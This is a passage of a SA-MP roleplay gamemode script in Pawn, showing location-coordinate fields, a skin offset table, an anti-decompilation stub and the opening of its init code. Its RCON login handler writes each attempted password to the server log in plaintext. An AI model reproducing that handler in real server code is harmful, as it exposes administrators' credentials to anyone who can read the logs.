	Float:PrenderX,
	Float:PrenderY,
	Float:PrenderZ,
	PrenderVirtualWorld,
	PrenderInterior,
	Impostos,
	FundoDesemprego,
	Float:ComprarDrogasX,
	Float:ComprarDrogasY,
	Float:ComprarDrogasZ,
	ComprarDrogasVirtualWorld,
	ComprarDrogasInterior,
	Float:ComprarMateriaisX,
	Float:ComprarMateriaisY,
	Float:ComprarMateriaisZ,
	ComprarMateriaisVirtualWorld,
	ComprarMateriaisInterior,
	Float:EntregarDrogasX,
	Float:EntregarDrogasY,
	Float:EntregarDrogasZ,
	EntregarDrogasVirtualWorld,
	EntregarDrogasInterior,
	Float:EntregarMateriaisX,
	Float:EntregarMateriaisY,
	Float:EntregarMateriaisZ,
	EntregarMateriaisVirtualWorld,
	EntregarMateriaisInterior,
	Float:TunningX,
	Float:TunningY,
	Float:TunningZ,
	TunningVirtualWorld,
	TunningInterior,
	TunningPickupID,
	Float:Banco1X,
	Float:Banco1Y,
	Float:Banco1Z,
	Banco1VirtualWorld,
	Banco1Interior,
	Banco1PickupID,
	Float:Banco2X,
	Float:Banco2Y,
	Float:Banco2Z,
	Banco2VirtualWorld,
	Banco2Interior,
	Banco2PickupID,
	PrecoAtestarG,
	Float:PoliciaX,
	Float:PoliciaY,
	Float:PoliciaZ,
	PoliciaVirtualWorld,
	PoliciaInterior,
	PoliciaPickupID,
	Float:ApreendidosX,
	Float:ApreendidosY,
	Float:ApreendidosZ,
	Float:ApreendidosA,
	ApreendidosVirtualWorld,
	ApreendidosInterior,
	Float:EntradaApreendidosX,
	Float:EntradaApreendidosY,
	Float:EntradaApreendidosZ,
	Float:EntradaApreendidosA,
	EntradaApreendidosVirtualWorld,
	EntradaApreendidosInterior,
	Float:VenderVeiculoX,
	Float:VenderVeiculoY,
	Float:VenderVeiculoZ,
	Float:CamaraMunicipalX,
	Float:CamaraMunicipalY,
	Float:CamaraMunicipalZ,
	CamaraMunicipalVirtualWorld,
	CamaraMunicipalInterior,
	CamaraMunicipalPickupID,
	NewsMusica1[128],
	NewsMusica2[128],
	NewsMusica3[128],
	NewsMusica4[128],
	NewsMusica5[128],
	NewsMusica6[128],
	NewsMusica1Alterador[MAX_PLAYER_NAME],
	NewsMusica2Alterador[MAX_PLAYER_NAME],
	NewsMusica3Alterador[MAX_PLAYER_NAME],
	NewsMusica4Alterador[MAX_PLAYER_NAME],
	NewsMusica5Alterador[MAX_PLAYER_NAME],
	NewsMusica6Alterador[MAX_PLAYER_NAME],
	NewsMusica1Nome[32],
	NewsMusica2Nome[32],
    NewsMusica3Nome[32],
    NewsMusica4Nome[32],
    NewsMusica5Nome[32],
    NewsMusica6Nome[32],
	ImpostoCarros,
	ImpostoCasas,
	ImpostoLojas,
	Float:AeroportoX,
	Float:AeroportoY,
	Float:AeroportoZ,
	AeroportoVirtualWorld,
	AeroportoInterior,
	AeroportoPickupID,
	Float:ComprarIscoX,
	Float:ComprarIscoY,
	Float:ComprarIscoZ,
	ComprarIscoVirtualWorld,
	ComprarIscoInterior,
	ComprarIscoPickupID,
	Float:LotaX,
	Float:LotaY,
	Float:LotaZ,
	LotaVirtualWorld,
	LotaInterior,
	LotaPickupID,
	Float:FabricaX,
	Float:FabricaY,
	Float:FabricaZ,
	FabricaVirtualWorld,
	FabricaInterior,
	FabricaPickupID,
};
new oInfo[1][OutroInfo];
new LicPickup;
new Text3D:LicLabel;
new TunningPickup;
new Text3D:TunningLabel;
new CEPickup;
new Text3D:CELabel;
new Text3D:PrenderLabel;
new Text3D:VenderVeiculoLabel;
new BancoPickup[2];
new Text3D:BancoLabel[2];
new PoliciaPickup;
new Text3D:PoliciaLabel;
new CamaraMunicipalPickup;
new Text3D:CamaraMunicipalLabel;
new AeroportoPickup;
new Text3D:AeroportoLabel;
new LotaPickup;
new Text3D:LotaLabel;
new IscoPickup;
new Text3D:IscoLabel;
new FabricaPickup;
new Text3D:FabricaLabel;

new Float:SkinOffSet[300][7] = {
{0.098771, 0.030772, -0.000335, 85.342658, 84.122947, 4.236968 }, // - 0
{0.100766, 0.028630, -0.003521, 87.936676, 82.110870, 4.236968 }, // - 1
{0.083712, 0.033132, -0.003521, 87.936676, 82.110870, 4.236968 }, // - 2
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968},// - 3
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968},// - 4
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968},// - 5
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968},// - 6
{0.090066, 0.043458, -0.006523, 87.936676, 82.110870, 4.236968 }, // - 7
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968},// - 8
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968 },  // - 9
{0.072317, 0.032179, -0.002934, 86.843269, 84.196006, 4.236968 }, // - 10
{0.072317, 0.035465, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 11
{0.072317, 0.028100, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 12
{0.076569, 0.028100, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 13
{0.091310, 0.049169, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 14
{0.073734, 0.006292, -0.002755, 86.843269, 84.196006, 4.236968 }, // - 15
{0.092845, 0.040331, 0.000183, 86.843269, 82.864280, 4.236968 },  // - 16
{0.088241, 0.030184, -0.000157, 86.843269, 82.864280, 4.236968 }, // - 17
{0.061677, 0.029596, -0.007398, 86.843269, 82.864280, 4.236968 }, // - 18
{0.079911, 0.029596, -0.002934, 86.843269, 82.864280, 4.236968 }, // - 19
{0.095079, 0.029596, -0.001718, 85.261871, 86.296562, 4.236968 }, // - 20
{0.093728, 0.042083, -0.005781, 85.261871, 81.636192, 4.236968 }, // - 21
{0.079585, 0.042083, -0.005781, 85.261871, 81.636192, 4.236968 }, // - 22
{0.090786, 0.041737, -0.005263, 85.261871, 81.636192, 4.236968 }, // - 23
{0.085247, 0.026941, -0.000317, 85.261871, 81.636192, 4.236968 }, // - 24
{0.081646, 0.031448, -0.001113, 89.393653, 81.665985, 4.236968 }, // - 25
{0.083700, 0.033814, -0.001960, 86.436462, 81.665985, 4.236968 }, // - 26
{0.092498, 0.037321, -0.001960, 86.436462, 85.568023, 4.236968 }, // - 27
{0.097068, 0.041360, -0.007881, 86.771400, 85.568023, 4.236968 }, // - 28
{0.083456, 0.050595, 0.001011, 86.771400, 77.201461, 4.236968 },  // - 29
{0.076983, 0.047168, -0.006161, 86.771400, 74.329719, 4.236968 }, // - 30
{0.083798, 0.042184, -0.001869, 86.771400, 83.181861, 4.236968 }, // - 31
{0.053021, -0.000587, -0.001869, 86.771400, 66.859710, 4.236968 },// - 32
{0.034386, 0.013324, -0.001869, 86.771400, 80.314460, 4.236968 }, // - 33
{0.104669, 0.037365, -0.001403, 86.771400, 87.178382, 4.236968 }, // - 34
{0.102659, 0.037465, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 35
{0.107638, 0.037465, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 36
{0.107638, 0.035879, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 37
{0.107638, 0.041106, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 38
{0.080326, 0.035634, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 39
{0.080326, 0.027371, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 40
{0.084617, 0.039613, -0.001620, 86.771400, 93.020492, 4.236968 }, // - 41
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 42
{0.040075, 0.025445, -0.000974, 86.771400, 92.964149, 4.236968 }, // - 43
{0.077369, 0.028469, -0.000974, 86.771400, 78.435791, 4.236968 }, // - 44
{0.064145, 0.028684, -0.000974, 86.771400, 84.762802, 4.236968 }, // - 45
{0.091993, 0.056559, -0.000974, 86.771400, 84.762802, 4.236968 }, // - 46
{0.084582, 0.051277, -0.005034, 86.771400, 84.762802, 4.236968 }, // - 47
{0.092182, 0.042095, -0.003533, 86.771400, 84.762802, 4.236968 }, // - 48
{0.086866, 0.032203, -0.001021, 86.771400, 84.762802, 4.236968 }, // - 49
{0.099350, 0.009422, -0.005899, 86.771400, 84.762802, 4.236968 }, // - 50
{0.099350, 0.030598, -0.005899, 86.771400, 84.762802, 4.236968 }, // - 51
{0.099350, 0.030598, -0.003575, 86.771400, 84.762802, 4.236968 }, // - 52
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 53
{0.079123, 0.030598, -0.003575, 86.771400, 84.762802, 4.236968 }, // - 54
{0.063159, 0.029641, -0.003575, 86.771400, 84.762802, 4.236968 }, // - 55
{0.070293, 0.029641, -0.000570, 86.771400, 84.762802, 4.236968 }, // - 56
{0.111305, 0.045368, -0.000570, 86.771400, 84.458084, 4.236968 }, // - 57
{0.084901, 0.020965, -0.000570, 86.771400, 79.542411, 4.236968 }, // - 58
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 59
{0.090164, 0.044163, -0.004754, 86.771400, 79.542411, 4.236968 }, // - 60
{0.087151, 0.041447, -0.000885, 90.928329, 89.598678, 0.000000 }, // - 61
{0.094350, 0.041447, 0.005717, 90.928329, 89.598678, 0.000000 },  // - 62
{0.075534, 0.041447, -0.001751, 90.928329, 89.598678, 0.000000 }, // - 63
{0.075534, 0.041447, -0.001751, 90.928329, 89.598678, 0.000000 }, // - 64
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 65
{0.104148, 0.034787, 0.001341, 90.928329, 89.598678, 0.000000 },  // - 66
{0.104148, 0.034787, 0.001341, 90.928329, 89.598678, 0.000000 },  // - 67
{0.087317, 0.039646, -0.004032, 90.928329, 89.598678, 0.000000 }, // - 68
{0.074873, 0.039646, -0.003072, 90.928329, 89.598678, 0.000000 }, // - 69
{0.090391, 0.042364, 0.005494, 90.928329, 89.598678, 0.000000 },  // - 70
{0.090391, 0.022298, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 71
{0.090391, 0.039580, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 72
{0.090391, 0.038224, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 73
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 74
{0.083113, 0.038224, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 75
{0.072957, 0.028956, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 76
{0.069398, 0.039981, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 77
{0.105738, 0.010001, 0.004508, 90.928329, 79.030494, 0.000000 },  // - 78
{0.078264, 0.019668, 0.004508, 90.928329, 79.030494, 0.000000 },  // - 79
{0.087377, 0.022096, -0.001993, 90.928329, 79.030494, 0.000000 }, // - 80
{0.087377, 0.022096, -0.001635, 90.928329, 79.030494, 0.000000 }, // - 81
{0.100623, 0.043063, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 82
{0.092528, 0.027493, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 83
{0.102086, 0.027493, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 84
{0.081954, 0.041672, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 85
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 86
{0.077010, 0.046925, -0.003438, 90.928329, 91.590301, 0.000000 }, // - 87
{0.069952, 0.042635, -0.003438, 90.928329, 86.722587, 0.000000 }, // - 88
{0.093827, 0.019258, -0.003438, 90.928329, 86.722587, 0.000000 }, // - 89
{0.066464, 0.035685, -0.000843, 90.928329, 86.722587, 0.000000 }, // - 90
{0.066464, 0.035685, -0.000843, 90.928329, 86.722587, 0.000000 }, // - 91
{0.066464, 0.038135, -0.000843, 90.928329, 86.722587, 0.000000 }, // - 92
{0.066464, 0.038135, -0.001690, 90.928329, 86.722587, 0.000000 }, // - 93
{0.048124, 0.010598, -0.001690, 90.928329, 86.722587, 0.000000 }, // - 94
{0.084997, 0.006773, -0.001690, 90.928329, 86.722587, 0.000000 }, // - 95
{0.100076, 0.026633, -0.001690, 90.928329, 80.020179, 0.000000 }, // - 96
{0.061686, 0.027537, -0.001690, 90.928329, 80.020179, 0.000000 }, // - 97
{0.098318, 0.053993, -0.001690, 90.928329, 89.237678, 0.000000 }, // - 98
{0.098318, 0.033702, -0.001690, 90.928329, 89.237678, 0.000000 }, // - 99
{0.086149, 0.042526, -0.001690, 90.928329, 77.587478, 0.000000 }, // - 100
{0.081864, 0.030555, -0.001690, 90.928329, 78.145759, 0.000000 }, // - 101
{0.081864, 0.047914, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 102
{0.089607, 0.036717, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 103
{0.079655, 0.042021, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 104
{0.091779, 0.037620, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 105
{0.084179, 0.035251, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 106
{0.089387, 0.040297, -0.006006, 90.928329, 78.145759, 0.000000 }, // - 107
{0.081930, 0.030756, 0.001523, 90.928329, 78.145759, 0.000000 },  // - 108
{0.092857, 0.043070, -0.006084, 90.928329, 85.326652, 0.000000 }, // - 109
{0.092857, 0.043070, -0.006084, 90.928329, 85.326652, 0.000000 }, // - 110
{0.106601, 0.028021, -0.003537, 90.928329, 90.217376, 0.000000 }, // - 111
{0.096335, 0.015873, -0.003537, 90.928329, 90.217376, 0.000000 }, // - 112
{0.105827, 0.046620, -0.001395, 90.928329, 90.217376, 0.000000 }, // - 113
{0.097520, 0.044296, -0.007286, 90.928329, 90.217376, 0.000000 }, // - 114
{0.097408, 0.043470, -0.007286, 90.928329, 90.217376, 0.000000 }, // - 115
{0.092588, 0.049832, -0.007286, 90.928329, 90.217376, 0.000000 }, // - 116
{0.081444, 0.037602, -0.003125, 90.928329, 90.217376, 0.000000 }, // - 117
{0.078678, 0.037602, -0.001816, 90.928329, 90.217376, 0.000000 }, // - 118
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 119
{0.089214, 0.029291, -0.000784, 90.928329, 84.624763, 0.000000 }, // - 120
{0.086825, 0.033424, -0.000784, 90.928329, 77.233818, 0.000000 }, // - 121
{0.082869, 0.030783, -0.000950, 90.928329, 77.233818, 0.000000 }, // - 122
{0.096117, 0.048957, -0.006245, 90.928329, 87.579650, 0.000000 }, // - 123
{0.103663, 0.040022, 0.000449, 90.928329, 87.579650, 0.000000 },  // - 124
{0.099326, 0.031202, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 125
{0.099326, 0.031132, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 126
{0.099326, 0.039279, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 127
{0.099326, 0.047422, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 128
{0.088817, 0.021210, 0.000730, 90.928329, 87.579650, 0.000000 },  // - 129
{0.025784, 0.028323, 0.000730, 90.928329, 59.394767, 0.000000 },  // - 130
{0.068455, 0.031841, -0.004470, 90.928329, 79.979003, 0.000000 }, // - 131
{0.012930, 0.008392, -0.004470, 90.928329, 72.129173, 0.000000 }, // - 132
{0.102457, 0.032260, -0.003338, 90.928329, 84.534217, 0.000000 }, // - 133
{0.085976, 0.014956, -0.003338, 90.928329, 80.308830, 0.000000 }, // - 134
{0.071574, 0.028186, -0.001588, 90.928329, 80.308830, 0.000000 }, // - 135
{0.085219, 0.016666, -0.000738, 90.928329, 80.308830, 0.000000 }, // - 136
{0.065114, 0.009318, -0.000738, 90.928329, 80.308830, 0.000000 }, // - 137
{0.066890, 0.040024, -0.000738, 90.928329, 87.341934, 0.000000 }, // - 138
{0.072037, 0.036141, -0.000702, 90.928329, 87.341934, 0.000000 }, // - 139
{0.069108, 0.042194, -0.000436, 90.928329, 87.341934, 0.000000 }, // - 140
{0.058717, 0.043547, -0.000436, 90.928329, 87.209770, 0.000000 }, // - 141
{0.104196, 0.039601, -0.005481, 90.928329, 87.209770, 0.000000 }, // - 142
{0.090929, 0.045881, -0.012780, 90.928329, 87.209770, 0.000000 }, // - 143
{0.098291, 0.042464, -0.006952, 90.928329, 83.081665, 0.000000 }, // - 144
{0.080087, 0.030122, 0.000606, 90.928329, 83.081665, 0.000000 },  // - 145
{0.093500, 0.030690, -0.001545, 90.928329, 83.081665, 0.000000 }, // - 146
{0.079566, 0.020138, 0.004838, 90.928329, 73.715591, 0.000000 },  // - 147
{0.073564, 0.028430, -0.000527, 90.928329, 88.295433, 0.000000 }, // - 148
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 149
{0.073564, 0.028430, -0.000527, 90.928329, 88.295433, 0.000000 }, // - 150
{0.083426, 0.032359, -0.005717, 90.928329, 88.295433, 0.000000 }, // - 151
{0.072349, 0.019623, -0.000747, 90.928329, 82.624351, 0.000000 }, // - 152
{0.075065, 0.015351, 0.006545, 90.928329, 71.041442, 0.000000 },  // - 153
{0.062227, 0.029731, -0.004938, 90.928329, 84.602760, 0.000000 }, // - 154
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 155
{0.079936, 0.049000, -0.000304, 90.928329, 82.926010, 0.000000 }, // - 156
{0.067550, 0.035686, -0.000017, 90.928329, 82.926010, 0.000000 }, // - 157
{0.090676, 0.039383, -0.001726, 90.928329, 88.667900, 0.000000 }, // - 158
{0.090676, 0.039383, -0.003532, 90.928329, 88.667900, 0.000000 }, // - 159
{0.098662, 0.017441, -0.001589, 90.928329, 88.667900, 0.000000 }, // - 160
{0.105388, 0.038409, 0.003155, 90.928329, 88.667900, 0.000000 },  // - 161
{0.097415, 0.036904, -0.000525, 90.928329, 88.667900, 0.000000 }, // - 162
{0.088934, 0.023302, -0.004153, 90.928329, 80.393875, 0.000000 }, // - 163
{0.088934, 0.023302, -0.004153, 90.928329, 80.393875, 0.000000 }, // - 164
{0.087018, 0.051364, 0.000484, 90.928329, 94.584838, 0.000000 },  // - 165
{0.087018, 0.051364, 0.000484, 90.928329, 94.584838, 0.000000 },  // - 166
{0.095996, 0.038787, 0.000484, 90.928329, 84.315711, 0.000000 },  // - 167
{0.089094, 0.034001, -0.006451, 90.928329, 84.315711, 0.000000 }, // - 168
{0.075700, 0.028082, -0.006451, 90.928329, 84.315711, 0.000000 }, // - 169
{0.093751, 0.041968, -0.005545, 90.928329, 84.315711, 0.000000 }, // - 170
{0.090124, 0.031055, -0.000505, 90.928329, 84.315711, 0.000000 }, // - 171
{0.066033, 0.032915, -0.002713, 90.928329, 84.315711, 0.000000 }, // - 172
{0.088287, 0.045350, -0.005384, 90.928329, 84.315711, 0.000000 }, // - 173
{0.087750, 0.042129, -0.005384, 90.928329, 84.315711, 0.000000 }, // - 174
{0.092384, 0.039294, -0.005384, 90.928329, 84.315711, 0.000000 }, // - 175
{0.097661, 0.039065, -0.006344, 90.928329, 80.736480, 0.000000 }, // - 176
{0.097114, 0.039641, -0.006692, 90.928329, 80.736480, 0.000000 }, // - 177
{0.069354, 0.039641, -0.000474, 90.928329, 80.736480, 0.000000 }, // - 178
{0.091414, 0.039641, -0.005617, 90.928329, 80.736480, 0.000000 }, // - 179
{0.094914, 0.039641, -0.005617, 90.928329, 80.736480, 0.000000 }, // - 180
{0.117232, 0.033217, -0.001099, 90.928329, 82.396362, 0.000000 }, // - 181
{0.082569, 0.032748, -0.003248, 90.928329, 87.394371, 0.000000 }, // - 182
{0.095527, 0.027237, -0.001960, 90.928329, 86.443649, 0.000000 }, // - 183
{0.095527, 0.040994, -0.006878, 90.928329, 86.443649, 0.000000 }, // - 184
{0.085663, 0.030601, -0.002345, 90.928329, 81.496513, 0.000000 }, // - 185
{0.085663, 0.030601, -0.001015, 90.928329, 81.496513, 0.000000 }, // - 186
{0.076527, 0.027211, 0.008500, 90.928329, 74.401092, 0.000000 },  // - 187
{0.096669, 0.032578, 0.001662, 90.928329, 83.502502, 0.000000 },  // - 188
{0.098753, 0.032129, -0.001659, 90.928329, 90.153724, 0.000000 }, // - 189
{0.092821, 0.035572, -0.001659, 90.928329, 90.153724, 0.000000 }, // - 190
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 191
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 192
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 193
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 194
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 195
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 196
{0.100630, 0.020568, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 197
{0.077905, 0.028523, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 198
{0.099095, 0.022463, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 199
{0.103182, 0.031106, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 200
{0.078426, 0.038546, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 201
{0.101092, 0.035797, -0.002997, 89.675476, 82.081153, 0.000000 }, // - 202
{0.092009, 0.042780, -0.005841, 89.675476, 84.463294, 0.000000 }, // - 203
{0.092009, 0.042780, -0.005841, 89.675476, 84.463294, 0.000000 }, // - 204
{0.092969, 0.027782, -0.002959, 89.675476, 84.463294, 0.000000 }, // - 205
{0.105109, 0.036128, -0.000471, 89.675476, 84.463294, 0.000000 }, // - 206
{0.066892, 0.024410, -0.002792, 89.675476, 84.463294, 0.000000 }, // - 207
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 208
{0.084046, 0.013608, -0.002792, 89.675476, 81.667831, 0.000000 }, // - 209
{0.084046, 0.013608, -0.001034, 89.675476, 81.667831, 0.000000 }, // - 210
{0.067610, 0.033777, -0.001034, 89.675476, 85.214485, 0.000000 }, // - 211
{0.094159, 0.020717, 0.000715, 89.675476, 85.214485, 0.000000 },  // - 212
{0.098744, 0.036786, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 213
{0.068755, 0.036786, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 214
{0.068755, 0.026863, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 215
{0.068755, 0.026863, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 216
{0.095765, 0.030034, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 217
{0.085486, 0.039427, -0.003311, 89.675476, 85.214485, 0.000000 }, // - 218
{0.068874, 0.027850, -0.001021, 89.675476, 85.214485, 0.000000 }, // - 219
{0.052931, 0.050390, -0.002062, 89.675476, 88.113647, 0.000000 }, // - 220
{0.094479, 0.034432, 0.000875, 89.675476, 83.572830, 0.000000 },  // - 221
{0.094479, 0.034432, -0.000596, 89.675476, 83.572830, 0.000000 }, // - 222
{0.094479, 0.062073, -0.003098, 89.675476, 83.572830, 0.000000 }, // - 223
{0.064458, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000 }, // - 224
{0.064458, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000 }, // - 225
{0.072095, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000 }, // - 226
{0.110619, 0.043037, -0.001466, 89.675476, 86.927627, 0.000000 }, // - 227
{0.099446, 0.050772, -0.001466, 89.675476, 85.103805, 0.000000 }, // - 228
{0.078635, 0.023680, -0.000275, 89.675476, 73.445220, 0.000000 }, // - 229
{0.043357, 0.028726, -0.000275, 89.675476, 73.445220, 0.000000 }, // - 230
{0.092488, 0.049972, -0.000275, 89.675476, 88.981941, 0.000000 }, // - 231
{0.092488, 0.016739, -0.000275, 89.675476, 88.981941, 0.000000 }, // - 232
{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 233
{0.082745, 0.004209, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 234
{0.057909, 0.021331, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 235
{0.079016, 0.021331, -0.000419, 89.675476, 77.678733, 0.000000 }, // - 236
{0.074572, 0.021331, -0.000419, 89.675476, 84.527442, 0.000000 }, // - 237
{0.074572, 0.038346, -0.001500, 89.675476, 84.527442, 0.000000 }, // - 238
{0.111645, 0.011549, 0.006237, 89.675476, 84.527442, 0.000000 },  // - 239
{0.090766, 0.044221, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 240
{0.069491, 0.049021, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 241
{0.059706, 0.031911, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 242
{0.065242, 0.031911, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 243
{0.065242, 0.051077, -0.001103, 89.675476, 89.461883, 0.000000 }, // - 244
{0.082393, 0.038233, 0.000410, 89.675476, 89.461883, 0.000000 },  // - 245
{0.079338, 0.044859, -0.002535, 89.675476, 89.461883, 0.000000 }, // - 246
{0.101566, 0.037019, 0.000750, 89.675476, 83.514060, 0.000000 },  // - 247
{0.091887, 0.047776, -0.000040, 89.675476, 83.514060, 0.000000 }, // - 248
{0.089745, 0.044044, 0.004071, 89.675476, 83.514060, 0.000000 },  // - 249
{0.094214, 0.044044, -0.007274, 89.675476, 83.514060, 0.000000 }, // - 250
{0.072282, 0.044044, -0.001468, 89.675476, 90.444763, 0.000000 }, // - 251
{0.095764, 0.034224, -0.000264, 89.675476, 82.959915, 0.000000 }, // - 252
{0.087454, 0.026208, -0.000264, 89.675476, 82.959915, 0.000000 }, // - 253
{0.099198, 0.037362, -0.000264, 89.675476, 82.959915, 0.000000 }, // - 254
{0.070845, 0.019943, 0.003505, 89.675476, 73.529716, 0.000000 },  // - 255
{0.065373, 0.033656, -0.001141, 89.675476, 83.002151, 0.000000 }, // - 256
{0.070077, 0.033656, -0.001141, 89.675476, 83.002151, 0.000000 }, // - 257
{0.089536, 0.041904, 0.000715, 89.675476, 83.002151, 0.000000 },  // - 258
{0.084822, 0.041904, 0.000715, 89.675476, 83.002151, 0.000000 },  // - 259
{0.093009, 0.031491, -0.001568, 89.675476, 83.002151, 0.000000 }, // - 260
{0.093009, 0.015023, -0.001477, 89.675476, 83.002151, 0.000000 }, // - 261
{0.076580, 0.039782, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 262
{0.076580, 0.028967, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 263
{0.075424, 0.043059, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 264
{0.089655, 0.021726, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 265
{0.096792, 0.014114, -0.003062, 89.675476, 85.166038, 0.000000 }, // - 266
{0.094886, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000 }, // - 267
{0.094886, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000 }, // - 268
{0.102252, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000 }, // - 269
{0.102252, 0.024989, 0.000529, 89.675476, 85.166038, 0.000000 },  // - 270
{0.096134, 0.025462, 0.000529, 89.675476, 79.225112, 0.000000 },  // - 271
{0.099226, 0.032663, 0.000529, 89.675476, 79.225112, 0.000000 },  // - 272
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 273
{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000 }, // - 274
{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000 }, // - 275
{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000 }, // - 276
{0.082718, 0.062596, -0.000201, 89.675476, 88.636062, 0.000000 }, // - 277
{0.082718, 0.062596, -0.000201, 89.675476, 88.636062, 0.000000 }, // - 278
{0.087652, 0.059379, -0.000201, 89.675476, 88.636062, 0.000000 }, // - 279
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 280
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 281
{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 282
{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 283
{0.090877, 0.053674, 0.009879, 89.675476, 88.636062, 0.000000 },  // - 284
{0.104320, 0.041487, 0.008021, 89.675476, 88.636062, 0.000000 },  // - 285
{0.087062, 0.021779, -0.003307, 89.675476, 88.636062, 0.000000 }, // - 286
{0.073173, 0.048856, 0.005337, 89.675476, 92.561180, 0.000000 },  // - 287
{0.090294, 0.027592, -0.003497, 89.675476, 92.561180, 0.000000 }, // - 288
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 289
{0.086562, 0.042698, -0.000612, 89.675476, 92.561180, 0.000000 }, // - 290
{0.096768, 0.039233, -0.000612, 89.675476, 83.550270, 0.000000 }, // - 291
{0.079939, 0.020731, -0.005162, 89.675476, 83.550270, 0.000000 }, // - 292
{0.097107, 0.027826, -0.005162, 89.675476, 88.505996, 0.000000 }, // - 293
{0.097107, 0.037636, 0.000618, 89.675476, 88.505996, 0.000000 },  // - 294
{0.079985, 0.035006, -0.000826, 89.675476, 87.533462, 0.000000 }, // - 295
{0.088445, 0.024209, -0.002076, 89.675476, 73.285072, 0.000000 }, // - 296
{0.094039, 0.035411, 0.000490, 89.675476, 84.277572, 0.000000 },  // - 297
{0.099553, 0.024683, -0.002919, 89.675476, 84.277572, 0.000000 }, // - 298
{0.099553, 0.044356, -0.000285, 89.675476, 84.277572, 0.000000 }  // - 299
};

main()
{

}

AntiDeAMX()
{
	new a[][] =
	{
		"Unarmed (Fist)",
		"Brass K"
	};
	#pragma unused a
}

public OnRconLoginAttempt(ip[], password[], success)
{
	printf("ATTEMPT RCON LOGIN BY IP %s USING PASSWORD %s",ip, password);

    return 1;
}

public OnGameModeInit()
{
	new tick1;
	new tick2;

